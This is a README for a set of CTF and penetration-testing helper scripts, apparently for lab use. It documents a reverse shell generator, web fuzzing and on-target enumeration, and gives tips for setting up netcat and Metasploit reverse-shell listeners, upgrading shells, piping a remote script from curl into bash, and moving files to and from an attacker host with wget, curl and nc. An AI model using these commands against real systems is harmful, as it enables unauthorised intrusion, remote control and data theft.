# CTF Scripts

This directory contains various helper scripts for CTF challenges and penetration testing.

## Available Scripts

### 1. Reverse Shell Generator (`revshell_gen.py`)

Generates reverse shell payloads for various languages and environments.

**Usage:**
```bash
# Show common shells
python3 revshell_gen.py -l 10.10.14.5 -p 4444

# Show all available shells
python3 revshell_gen.py -l 10.10.14.5 -p 4444 -a

# Generate specific shell type
python3 revshell_gen.py -l 10.10.14.5 -p 4444 -s python3

# List available shell types
python3 revshell_gen.py -l 10.10.14.5 -p 4444 --list
```

**Supported shell types:**
- bash-tcp, bash-196, bash-5
- nc (netcat traditional and OpenBSD)
- python, python3
- perl, php-exec, php-system
- ruby, java, powershell
- socat, awk, nodejs
- bash-url (URL encoded)
- bash-b64 (Base64 encoded)

### 2. Web Fuzzing Helper (`web_fuzz.sh`)

Automates common web enumeration tasks using tools like gobuster, ffuf, nikto, etc.

**Usage:**
```bash
# Run all enumeration types
./web_fuzz.sh -u http://example.com -a

# Directory fuzzing only
./web_fuzz.sh -u http://example.com --dirs

# Virtual host fuzzing
./web_fuzz.sh -u http://example.com --vhosts

# Custom wordlist and extensions
./web_fuzz.sh -u http://example.com --dirs -w /path/to/wordlist.txt -e php,html,js

# Subdomain enumeration
./web_fuzz.sh -u http://example.com --subdomains
```

**Options:**
- `-u, --url`: Target URL (required)
- `-w, --wordlist`: Custom wordlist path
- `-e, --extensions`: File extensions (default: php,html,txt,js)
- `-t, --threads`: Number of threads (default: 50)
- `-o, --output`: Output directory (default: ./web_enum)
- `-a, --all`: Run all enumeration types
- `--dirs`: Directory fuzzing
- `--vhosts`: Virtual host fuzzing
- `--subdomains`: Subdomain enumeration
- `--params`: Parameter fuzzing

### 3. Quick Enumeration Script (`quick_enum.sh`)

A quick Linux enumeration script to run on target machines after getting a shell.

**Usage:**
```bash
# On target machine
bash quick_enum.sh

# Or download and execute
curl http://your-server/quick_enum.sh | bash
```

**What it checks:**
- System information (hostname, kernel, OS)
- Current user and privileges
- Sudo privileges
- SUID files
- World-writable files
- Network information
- Listening ports
- Scheduled tasks (cron jobs)
- Users with shell access
- Password file permissions
- Interesting configuration files
- Environment variables

## Tips

### Setting up a listener

For reverse shells:
```bash
# Netcat listener
nc -lvnp 4444

# Metasploit listener
msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run'

# With rlwrap for better shell
rlwrap nc -lvnp 4444
```

### Upgrading shells

Once you have a basic shell:
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Script command
/usr/bin/script -qc /bin/bash /dev/null
```

### File transfer

Transfer files to/from target:
```bash
# On attacker (serve files)
python3 -m http.server 8000

# On target (download)
wget http://10.10.14.5:8000/file
curl http://10.10.14.5:8000/file -o file

# Upload with nc
# Attacker: nc -lvnp 4444 > file
# Target: nc 10.10.14.5 4444 < file
```

## Contributing

Feel free to add more scripts or improve existing ones!
